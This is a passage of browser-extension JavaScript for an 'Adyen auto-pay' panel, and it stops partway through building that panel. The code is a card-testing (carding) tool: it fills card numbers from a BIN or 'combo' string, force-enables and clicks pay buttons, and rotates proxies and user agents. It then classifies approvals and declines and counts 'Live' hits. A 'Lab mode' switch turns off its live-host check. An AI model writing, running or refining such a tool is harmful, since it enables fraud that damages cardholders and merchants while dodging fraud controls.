"use strict";

(function () {
  if (window.__nonoArmed) return;
  window.__nonoArmed = true;

  const cfgKey = "adyenPayload";
  const frameId = "f" + Math.random().toString(36).slice(2, 9);
  const isTop = window.self === window.top;
  let running = false;
  let stopRequested = false;
  let tries = 0;
  let liveHits = 0;
  let currentTick = "";
  let pendingCard = null;
  let capturedResps = [];
  let modalStarted = false;

  const VERSION = "1.10";

  function gateSessionUrl(rawUrl, lab) {
    const u = String(rawUrl || "");
    if (lab) return { ok: true, reason: "lab" };
    if (/clientKey=live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
    if (/--data-raw[\s\S]{0,400}clientKey[:\\" ]+live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
    if (/(https?:\/\/[^\/\s]*)?checkoutshopper-live\.adyen\.com/i.test(u)) return { ok: false, reason: "live adyen host refused" };
    if (/(https?:\/\/[^\/\s]*)?checkoutshopper\.adyen\.com(\/|$)/i.test(u)) return { ok: false, reason: "live adyen host refused" };
    return { ok: true, reason: "ok" };
  }

  function getLab() {
    return new Promise((resolve) => {
      chrome.storage.local.get("nonoLab", (r) => {
        resolve(!!(r.nonoLab && r.nonoLab.enabled));
      });
    });
  }

  function isPrivateHost(u) {
    let host = "";
    try { host = new URL(String(u)).hostname; } catch (e) { return false; }
    if (host === "localhost" || host === "127.0.0.1" || host === "::1") return true;
    if (/^10\./.test(host)) return true;
    if (/^192\.168\./.test(host)) return true;
    if (/^172\.(1[6-9]|2\d|3[01])\./.test(host)) return true;
    return false;
  }

  function hostAllowed(u, lab) {
    const h = String(u || "").toLowerCase();
    if (/(^|\.)adyen\.(com|link)/.test(h)) {
      return lab || /checkoutshopper-test\.adyen\.com/.test(h);
    }
    if (isPrivateHost(h)) return true;
    let host = "";
    try { host = new URL(h).hostname; } catch (e) { return false; }
    const parts = [];
    host.split(".").forEach((label) => parts.push.apply(parts, label.split("-")));
    const set = new Set(parts.map((p) => p.trim()).filter(Boolean));
    for (const t of ["localhost", "sandbox", "test", "dev", "stage", "staging", "qa", "demo", "mock", "sim", "lab"]) {
      if (set.has(t)) return true;
    }
    return false;
  }

  function looksAdyenish(u) {
    const h = String(u || "").toLowerCase();
    return /adyen|checkoutshopper/.test(h);
  }

  function removeBlockedNotice() {
    const b = document.getElementById("nono-blocked");
    if (b) b.remove();
  }

  function buildBlockedNotice() {
    if (document.getElementById("nono-blocked")) return;
    const box = document.createElement("div");
    box.id = "nono-blocked";
    box.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(300px, calc(100vw - 20px))", "background:#2a1216",
      "color:#ffd9d9", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #6e2830", "border-radius:12px", "padding:12px 14px",
      "font-size:12px", "box-shadow:0 12px 36px rgba(0,0,0,.55)",
      "display:flex", "flex-direction:column", "gap:8px"
    ].join(";");
    box.innerHTML =
      '<div style="font-weight:700;font-size:11px;letter-spacing:.6px;text-transform:uppercase;color:#ff7d7d">&#128308; ADYEN AUTO-PAY — BLOCKED</div>' +
      '<div style="color:#ffd9d9;line-height:1.5">This page looks like a live Adyen host, so the panel is kept off.<br>' +
      'You are using a sandbox sim? Open <b>Options</b> (right-click icon) and turn <b>Lab mode</b> ON — the panel appears here instantly.</div>' +
      '<div style="display:flex;gap:8px;align-items:center">' +
      '<button id="nono-blocked-open" style="background:#7d3a3a;color:#fff;border:none;border-radius:7px;padding:7px 10px;font-size:11px;font-weight:700;cursor:pointer">Open Options</button>' +
      '<button id="nono-blocked-dismiss" style="background:none;border:none;color:#aaa;cursor:pointer;font-size:11px">Dismiss</button>' +
      '</div>';
    document.body.appendChild(box);
    const open = box.querySelector("#nono-blocked-open");
    if (open) {
      open.addEventListener("click", () => {
        try { chrome.runtime.openOptionsPage(); } catch (e) {}
      });
    }
    const dismiss = box.querySelector("#nono-blocked-dismiss");
    if (dismiss) {
      dismiss.addEventListener("click", () => removeBlockedNotice());
    }
  }

  function defaultBrowserInfo() {
    return {
      acceptHeader: "*/*",
      javaEnabled: false,
      colorDepth: (window.screen && window.screen.colorDepth) || 24,
      language: (navigator.language) || "en-GB",
      screenHeight: (window.screen && window.screen.height) || 832,
      screenWidth: (window.screen && window.screen.width) || 384,
      userAgent: navigator.userAgent || "",
      timeZoneOffset: -new Date().getTimezoneOffset()
    };
  }

  function parseCheckshopper(text) {
    const raw = String(text || "").trim();
    if (!raw) return null;

    const urlMatch = raw.match(/https?:\/\/[^\s'"\)]+/);
    let bodyText = "";

    const dm = raw.match(/--data-raw\s+\$?'?((?:[^'\\]|\\.)+)'?/);
    if (dm) {
      bodyText = dm[1]
        .replace(/\\'/g, "'")
        .replace(/\\\\/g, "\\")
        .replace(/\\n/g, "")
        .replace(/\\r/g, "")
        .replace(/\\t/g, "");
    } else if (/^[\[{]/.test(raw.trim())) {
      bodyText = raw.trim();
    } else {
      try {
        const j = JSON.parse(raw);
        if (j && typeof j === "object") bodyText = raw;
      } catch (e) {}
    }

    let body = null;
    if (bodyText) {
      try { body = JSON.parse(bodyText); } catch (e) {}
    }

    if (!urlMatch) {
      if (body && body.sessionData) {
        return {
          payUrl: "", sessionId: "", clientKey: "",
          sessionData: body.sessionData, browserInfo: body.browserInfo || null
        };
      }
      return null;
    }

    let u;
    try { u = new URL(urlMatch[0]); } catch (e) { return null; }

    const origin = u.origin;
    const path = u.pathname;
    const clientKey = u.searchParams.get("clientKey") || (body && body.clientKey) || "";
    const sm = path.match(/\/sessions\/([A-Za-z0-9_-]+)/);
    const sessionId = sm ? sm[1] : "";

    let payUrl = "";
    if (/\/payments(\?|$)/.test(path)) {
      payUrl = u.href;
    } else if (sessionId) {
      payUrl = origin + "/checkoutshopper/v1/sessions/" + sessionId + "/payments" +
        (clientKey ? "?clientKey=" + encodeURIComponent(clientKey) : "");
    } else {
      payUrl = origin + "/checkoutshopper/v1/payments";
    }

    return {
      payUrl: payUrl,
      sessionId: sessionId,
      clientKey: clientKey,
      sessionData: (body && body.sessionData) || "",
      browserInfo: (body && body.browserInfo) || null,
      origin: origin
    };
  }

  function injectHook() {
    try {
      chrome.runtime.sendMessage({ action: "FF_HOOK" }, () => {});
    } catch (e) {}
  }

  function attachCapture() {
    try {
      chrome.runtime.sendMessage({ action: "DBG_ATTACH" }, () => {});
    } catch (e) {}
  }

  function detachCapture() {
    try {
      chrome.runtime.sendMessage({ action: "DBG_DETACH" }, () => {});
    } catch (e) {}
  }

  function proxyMsg(payload) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage(payload, (res) => {
          if (chrome.runtime.lastError || !res) resolve({ ok: false, proxy: null });
          else resolve(res);
        });
      } catch (e) {
        resolve({ ok: false, proxy: null });
      }
    });
  }

  async function refreshProxyStatus() {
    const s = await proxyMsg({ action: "PROXY_STATUS" });
    const el = document.getElementById("nono-proxy-label");
    if (!el) return;
    el.textContent = "Proxy: " + (s && s.label ? s.label : "OFF");
  }

  document.addEventListener("nonnho-capture", (e) => {
    const d = e.detail || {};
    if (!d || !d.body) return;
    capturedResps.push({ at: Date.now(), url: d.url || "", status: d.status, body: String(d.body) });
    if (capturedResps.length > 60) capturedResps.shift();
  });

  function parseAdyenResp(body) {
    try {
      const j = JSON.parse(body);
      if (!j || typeof j !== "object") return null;
      const out = {};
      out.resultCode = j.resultCode || "";
      out.refusalReason = j.refusalReason || "";
      out.refusalCode = j.refusalReasonCode || "";
      out.psp = j.pspReference || "";
      out.action = (j.action && j.action.type) || "";
      if (out.resultCode || out.refusalReason || out.action) return out;
      return null;
    } catch (e) {
      return null;
    }
  }

  function lastRespSince(ts) {
    for (let i = capturedResps.length - 1; i >= 0; i--) {
      if (capturedResps[i].at >= ts) return capturedResps[i];
    }
    return null;
  }

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => {
        resolve(res[cfgKey] || null);
      });
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function typeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, "");
    try {
      el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" }));
    } catch (e) {}
    const str = String(value);
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      desc.set.call(el, el.value + ch);
      try {
        el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new InputEvent("beforeinput", { bubbles: true, cancelable: true, inputType: "insertText", data: ch }));
        el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "insertText", data: ch }));
        el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
      } catch (e) {
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
    }
    try {
      el.dispatchEvent(new InputEvent("input", { bubbles: true }));
    } catch (e) {}
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
    el.dispatchEvent(new FocusEvent("focusout", { bubbles: true }));
  }

  function classifyField(el) {
    const s = ((el.id || "") + " " + (el.name || "") + " " +
      (el.getAttribute("aria-label") || "") + " " +
      (el.getAttribute("data-fieldtype") || "") + " " +
      (el.getAttribute("autocomplete") || "") + " " +
      (typeof el.className === "string" ? el.className : "")).toLowerCase();
    if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return "number";
    if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
    if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
    if (/(cvc|cvv|csc|security)[-_ ]*(code)?/.test(s)) return "cvc";
    return null;
  }

  function fillOwned(card) {
    const fields = { number: false, month: false, year: false, cvc: false };
    let any = false;

    const inputs = Array.from(document.querySelectorAll("input"));
    for (const inp of inputs) {
      if (inp.type === "hidden") continue;
      const kind = classifyField(inp);
      if (!kind) continue;
      if (kind === "number" && !fields.number) {
        typeValue(inp, card.number || "");
        fields.number = true; any = true;
      } else if (kind === "month" && !fields.month) {
        typeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0"));
        fields.month = true; any = true;
      } else if (kind === "year" && !fields.year) {
        typeValue(inp, String(card.year || card.expiryYear || "2029").slice(-2));
        fields.year = true; any = true;
      } else if (kind === "cvc" && !fields.cvc) {
        typeValue(inp, card.cvc || "");
        fields.cvc = true; any = true;
      }
    }

    if (!fields.number) {
      const n = document.querySelector('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]');
      if (n) { typeValue(n, card.number || ""); fields.number = true; any = true; }
    }
    if (!fields.month && !fields.year) {
      const e = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]');
      if (e) {
        typeValue(e, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" +
          String(card.year || card.expiryYear || "2029").slice(-2));
        fields.month = true; fields.year = true; any = true;
      }
    }
    if (!fields.cvc) {
      const c = document.querySelector('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]');
      if (c) { typeValue(c, card.cvc || ""); fields.cvc = true; any = true; }
    }

    const holder = document.querySelector('input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]');
    if (holder) setNativeValue(holder, card.holder || "JOHN DOE");

    const email = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
    const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
    if (email && maybeEmail) setNativeValue(email, maybeEmail);

    return { fields, any };
  }

  function frameReportKey(pref, id) {
    return pref + "_" + id;
  }

  function report(pref, obj) {
    chrome.storage.local.set({ [frameReportKey(pref, frameId)]: obj });
  }

  function clearReports(pref) {
    chrome.storage.local.get(null, (all) => {
      const toDel = Object.keys(all).filter((k) => k.indexOf(pref) === 0);
      if (toDel.length) chrome.storage.local.remove(toDel);
    });
  }

  function summarize(pref) {
    return new Promise((resolve) => {
      chrome.storage.local.get(null, (all) => {
        const agg = { number: false, month: false, year: false, cvc: false, any: false, frames: 0, texts: [] };
        Object.keys(all).forEach((k) => {
          if (k.indexOf(pref) !== 0) return;
          const r = all[k];
          if (!r || r.tick === undefined || r.tick !== currentTick) return;
          agg.frames++;
          if (r.fields) {
            ["number", "month", "year", "cvc"].forEach((f) => {
              if (r.fields[f]) agg[f] = true;
            });
            if (r.any) agg.any = true;
          }
          if (r.text) agg.texts.push(r.text);
        });
        resolve(agg);
      });
    });
  }

  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function waitReports(pref, minWait, maxWait) {
    const start = Date.now();
    let lastCount = -1;
    let lastChange = Date.now();
    await sleep(700);
    while (Date.now() - start < (maxWait || 7000)) {
      const s = await summarize(pref);
      if (s.frames > 0 && s.frames !== lastCount) {
        lastCount = s.frames;
        lastChange = Date.now();
      }
      if (s.frames > 0 && Date.now() - lastChange > 550) return s;
      if (Date.now() - start >= (minWait || 1800) && s.frames > 0) return s;
      await sleep(250);
    }
    return summarize(pref);
  }

  function execFill(card) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_EXEC", card: card }, (res) => {
          if (chrome.runtime.lastError || !res) {
            resolve({ any: false, fields: {}, error: chrome.runtime.lastError && chrome.runtime.lastError.message });
            return;
          }
          resolve(res);
        });
      } catch (e) {
        resolve({ any: false, fields: {}, error: String(e) });
      }
    });
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;

    if (changes["nonoLab"]) {
      reevaluate();
      return;
    }

    const ff = changes["nono_ff"];
    if (ff && ff.newValue && ff.newValue.card) {
      currentTick = ff.newValue.tick;
      pendingCard = ff.newValue.card;
      const r = fillOwned(pendingCard);
      report("nono_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
      return;
    }

    const dt = changes["nono_detect"];
    if (dt && dt.newValue) {
      currentTick = dt.newValue.tick;
      const text = document.body ? document.body.innerText.slice(0, 4000) : "";
      report("nono_dt", { tick: dt.newValue.tick, text: text });
      return;
    }

    const dbg = changes["nono_dbg"];
    if (dbg && dbg.newValue) {
      currentTick = dbg.newValue.tick;
      const inputs = Array.from(document.querySelectorAll("input")).map((i) => ({
        t: i.type, n: i.name || "", id: i.id || "",
        al: i.getAttribute("aria-label") || "",
        ac: i.getAttribute("autocomplete") || "",
        ft: i.getAttribute("data-fieldtype") || "",
        cls: (i.className || "").slice(0, 40),
        vis: !!(i.offsetWidth || i.offsetHeight)
      }));
      const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
      report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
    }

    const rsp = changes["nono_resp"];
    if (rsp && rsp.newValue && isTop) {
      const r = rsp.newValue;
      if (r.body && r.body.length > 4) {
        capturedResps.push({ at: Date.now(), url: r.url || "", status: 200, body: String(r.body) });
        if (capturedResps.length > 60) capturedResps.shift();
        const info = parseAdyenResp(r.body);
        if (info) {
          window.__nonoResult && window.__nonoResult("&#128269;",
            "RESP " + (info.resultCode || info.action || "?") +
            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
        }
      }
    }
  });

  function adyenUISignal() {
    if (document.querySelector('[class*="adyen-checkout"], [data-testid*="payment-method"], [class*="adyen-modal"]')) return true;
    const f = Array.from(document.querySelectorAll("iframe")).some((x) =>
      /checkoutshopper|adyen/.test(x.src || ""));
    return f;
  }

  const observer = new MutationObserver(() => {
    if (pendingCard) {
      const r = fillOwned(pendingCard);
      report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
    }
    if (!modalStarted && adyenUISignal()) {
      modalStarted = true;
      getConfig().then((cfg) => {
        if (cfg && cfg.autoOnLoad && !running && !stopRequested) {
          const b = document.getElementById("nono-start");
          if (b) {
            window.__nonoLog && window.__nonoLog("Adyen UI appeared — auto start.");
            b.click();
          }
        }
      });
    }
  });
  observer.observe(document.documentElement || document, {
    childList: true, subtree: true
  });

  function ensureCardMethod() {
    const methods = Array.from(document.querySelectorAll(
      '.adyen-checkout__payment-method, [data-testid*="payment-method"], [class*="payment-method"]'
    ));
    for (const m of methods) {
      const txt = (m.innerText || "").toLowerCase();
      if (/card|credit|debit/.test(txt)) {
        m.click();
        return true;
      }
    }
    const btns = Array.from(document.querySelectorAll("button, label, div[role='button']"));
    for (const b of btns) {
      const t = (b.innerText || "").replace(/\s+/g, " ").trim().toLowerCase();
      if (/^(credit|debit)?\s*(card|pay by card)$/.test(t) && b.offsetParent) {
        b.click();
        return true;
      }
    }
    return false;
  }

  function fireClick(b) {
    if (!b) return;
    try { b.scrollIntoView({ block: "center", behavior: "instant" }); } catch (e) {}
    try { b.focus({ preventScroll: true }); } catch (e) {}
    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
    ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].forEach((t) => {
      try {
        const Ctor = t.indexOf("pointer") === 0 ? PointerEvent : MouseEvent;
        b.dispatchEvent(new Ctor(t, opts));
      } catch (e) {
        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
      }
    });
    try { b.click(); } catch (e) {}
  }

  function findPayButton() {
    const buttons = Array.from(document.querySelectorAll(
      "button, [role='button'], a, input[type='submit'], input[type='button']"
    ));
    let adyenBtn = null;
    for (const b of buttons) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      const text = ((b.innerText || "") + " " + (b.getAttribute("aria-label") || "")).trim().toLowerCase();
      if (/adyen-checkout__button/.test(b.className || "")) {
        adyenBtn = adyenBtn || b;
      }
      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order)/i.test(text)) {
        return b;
      }
      if (/pay/i.test(text) && text.length < 40 && b.offsetParent) {
        adyenBtn = adyenBtn || b;
      }
    }
    if (adyenBtn && !adyenBtn.disabled) return adyenBtn;
    return adyenBtn;
  }

  function waitPayEnabled(timeout) {
    return new Promise((resolve) => {
      const start = Date.now();
      const timer = setInterval(() => {
        const btn = findPayButton();
        if (btn && !btn.disabled) {
          clearInterval(timer);
          resolve(btn);
        } else if (Date.now() - start > (timeout || 6000)) {
          clearInterval(timer);
          resolve(btn || null);
        }
      }, 400);
    });
  }

  function logButtons() {
    const out = [];
    const buttons = Array.from(document.querySelectorAll(
      "button, [role='button'], input[type='submit'], input[type='button'], a"
    ));
    for (const b of buttons.slice(0, 12)) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      out.push({
        t: ((b.innerText || b.value || "").trim() || "").slice(0, 30),
        a: (b.getAttribute("aria-label") || "").slice(0, 30),
        c: (b.className || "").slice(0, 40),
        d: !!b.disabled,
        vis: rect.width > 0
      });
    }
    window.__nonoResult && window.__nonoResult("&#128269;",
      "BTNS " + JSON.stringify(out).slice(0, 700), "#8fa3b5");
  }

  async function tryPayHard(card) {
    let ok = await submitClick(6);
    if (ok) return true;

    window.__nonoLog && window.__nonoLog("Pay not moving, waiting for enable...");
    const btn = await waitPayEnabled(6000);
    if (btn && !btn.disabled) {
      btn.click();
      await sleep(1600);
      if (isProcessing()) return true;
    }

    const anyBtn = findPayButton();
    if (anyBtn) {
      if (anyBtn.disabled) anyBtn.disabled = false;
      fireClick(anyBtn);
      await sleep(1600);
      if (isProcessing()) return true;
    }

    const adyenBtns = Array.from(document.querySelectorAll(".adyen-checkout__button, button[type='submit'], input[type='submit']"));
    for (const b of adyenBtns) {
      if (b === anyBtn) continue;
      if (b.disabled) b.disabled = false;
      fireClick(b);
      await sleep(900);
      if (isProcessing()) return true;
    }

    const forms = Array.from(document.querySelectorAll("form"));
    for (const f of forms) {
      try {
        f.dispatchEvent(new SubmitEvent("submit", { bubbles: true, cancelable: true }));
      } catch (e) {}
    }
    await sleep(1600);
    if (isProcessing()) return true;

    window.__nonoLog && window.__nonoLog("Pay click dead. Button inventory below 👇");
    logButtons();
    return false;
  }

  async function submitClick(retries) {
    retries = retries == null ? 8 : retries;
    for (let i = 0; i < retries; i++) {
      const btn = findPayButton();
      if (btn) {
        fireClick(btn);
      }
      await sleep(1300);
      if (isProcessing()) return true;
      const liBtn = findPayButton();
      if (liBtn && liBtn.disabled === false && i < 2) {
        await sleep(800);
        continue;
      }
    }
    return false;
  }

  function topDocText() {
    return document.body ? (document.body.innerText || "").toLowerCase() : "";
  }

  function topDocHtml() {
    return document.documentElement ? document.documentElement.innerHTML : "";
  }

  function detectResult(texts) {
    const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
    const html = topDocHtml();

    if (/adyen-checkout__threeds2|threeds2|3d-secure|\b3ds\b|threeds|challenge/.test(html)) {
      return { ok: true, label: "3DS CHALLENGE" };
    }
    const good = [
      "thank you", "payment successful", "payment complete", "approved",
      "processing", "redirecting", "almost done", "your payment was made",
      "payment succeeded", "success", "payment received"
    ];
    for (const g of good) {
      if (all.includes(g)) return { ok: true, label: "PROCESSED" };
    }
    const bad = [
      "declined", "refused", "invalid card number", "unsupported card", "expired",
      "not supported", "no sufficient", "insufficient", "invalid number",
      "cannot be used", "rejected", "failed", "do not honor",
      "card number is invalid", "security code is incorrect", "card expired",
      "payment not successful", "please try again"
    ];
    for (const b of bad) {
      if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
    }
    return null;
  }

  function buildPanel() {
    if (document.getElementById("nono-panel")) return;

    const panel = document.createElement("div");
    panel.id = "nono-panel";
    panel.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(320px, calc(100vw - 20px))", "background:#0b0e13",
      "color:#e6e6e6", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #1f2a33", "border-radius:14px", "padding:0",
      "box-shadow:0 12px 40px rgba(0,0,0,.65)", "font-size:12px",
      "user-select:none", "overflow:hidden", "transition:transform .28s ease,opacity .28s ease",
      "opacity:0", "transform:translateX(40px)", "max-height:calc(100vh - 20px)",
      "display:flex", "flex-direction:column"
    ].join(";");

    panel.innerHTML = `
      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:10px 12px;display:flex;justify-content:space-between;align-items:center">
        <div style="display:flex;align-items:center;gap:8px">
          <span style="font-size:16px">&#9889;</span>
          <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.10</span>
        </div>
        <div style="display:flex;gap:6px">
          <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
          <button id="nono-min" title="Minimize" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
        </div>
      </div>

      <div style="padding:12px;display:flex;flex-direction:column;gap:6px">
        <div style="display:flex;gap:6px">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Custom BIN</label>
            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
            <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
              <option value="16">16</option>
              <option value="15">15</option>
              <option value="19">19</option>
            </select>
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:flex-end">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Or Full Combo</label>
            <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
            <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
          </label>
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
          </label>
        </div>

        <div style="display:flex;gap:6px;margin-top:4px">
          <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
          <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
        </div>

        <div id="nono-proxy-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
          <span id="nono-proxy-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Proxy: OFF</span>
          <button id="nono-proxy-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
          <button id="nono-proxy-test" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">TEST</button>
          <button id="nono-proxy-off" style="padding:6px 8px;background:#3a2230;color:#ff7d7d;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">OFF</button>
        </div>

        <div id="nono-ua-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
          <span id="nono-ua-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">UA: OFF</span>
          <button id="nono-ua-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
          <button id="nono-ua-toggle" style="padding:6px 8px;background:#23303c;color:#ffd166;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">ON/OFF</button>
        </div>

        <div id="nono-cs" style="display:flex;flex-direction:column;gap:6px;margin-top:4px">
          <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Checkoutshopper URL / session</label>
          <textarea id="nono-cs-url" rows="3" spellcheck="false"
            placeholder="https://checkoutshopper-test.adyen.com/checkoutshopper/v1/sessions/{id}/setup?clientKey=test_...&#10;or paste the full curl with --data-raw {sessionData}"
            style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none;resize:vertical;font-family:monospace"></textarea>
          <div style="display:flex;gap:6px;align-items:center">
            <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
            <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
          </div>
        </div>

        <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
          <span style="color:#00d1b2" id="nono-log">Ready, Chief.</span>
          <span style="color:#ffcc00" id="nono-count">Live: 0</span>
        </div>

        <div id="nono-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>

        <div style="display:flex;justify-content:flex-end">
          <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
        </div>
      </div>
    `;

    document.body.appendChild(panel);

    const pill = document.createElement("div");
    pill.id = "nono-pill";
    pill.style.cssText = [
      "position:fixed", "right:10px", "top:30%", "z-index:2147483647",
      "width:48px", "height:48px", "border-radius:14px",
      "background:linear-gradient(135deg,#00d1b2,#00a88c)", "color:#00110d",
      "display:none", "align-items:center", "justify-content:center",
      "font-size:20px", "cursor:pointer", "box-shadow:0 6px 20px rgba(0,0,0,.5)",
      "touch-action:none", "user-select:none", "flex-direction:column", "gap:0"
    ].join(";");
    pill.innerHTML = '<span style="line-height:1">&#9889;</span><span id="nono-pill-count" style="font-size:8px;font-weight:700;line-height:1">0</span>';
    document.body.appendChild(pill);

    const box = panel.querySelector("#nono-results");
    const log = panel.querySelector("#nono-log");
    const count = panel.querySelector("#nono-count");
    const pillCount = document.getElementById("nono-pill-count");

